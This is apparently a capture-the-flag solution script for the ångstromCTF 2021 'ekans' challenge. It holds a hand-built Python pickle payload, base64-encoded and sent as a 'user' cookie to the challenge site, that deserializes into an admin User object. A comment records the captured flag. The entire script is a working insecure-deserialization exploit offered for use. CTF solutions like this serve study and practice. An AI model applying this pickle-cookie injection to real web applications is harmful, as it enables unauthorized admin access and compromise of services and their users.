#!/usr/bin/env python3

import base64
import requests

content = base64.b64encode("cdb\nUser\n(N(S'admin'\nI1\ndtb)R(S'admin'\nI0\ndbcdb\nUser\n(N(S'__setstate__'\ncdb\nUser\ndtb0.".encode("utf-8")).decode()

cookie = {
	'user': content
}

r = requests.get("https://ekans.2021.chall.actf.co/", cookies=cookie)
print(r.text)

# actf{what?_ekans_is_evolving..._into_3K4N5!}